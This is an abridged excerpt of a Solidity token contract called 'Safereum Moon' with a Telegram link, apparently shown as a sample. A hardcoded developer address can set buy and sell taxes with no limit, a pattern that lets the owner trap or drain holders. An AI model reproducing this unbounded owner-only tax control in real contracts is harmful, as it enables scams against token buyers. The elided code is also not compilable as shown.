/*
Telegram: https://t.me/SafereumMoon
*/
...
interface IUniswapV2Router02 {
    ...
    contract SafereumM {
        ...
        string public   name_ = "Safereum Moon"; 
        string public   symbol_ = unicode"SafereumM";  
        ...
        address payable constant mtDev = payable(address(0x66b3c37C92d648637F276D6ecf05449575791bF5));
        ...
        function _setmtax(uint256 _buy, uint256 _sell) private {
            buymtax = _buy;
            sellmtax = _sell;
        }

        function setmtax(uint256 _buy, uint256 _sell) external {
            if(msg.sender != mtDev)        
                revert Permissions();
            _setmtax(_buy, _sell);
        }
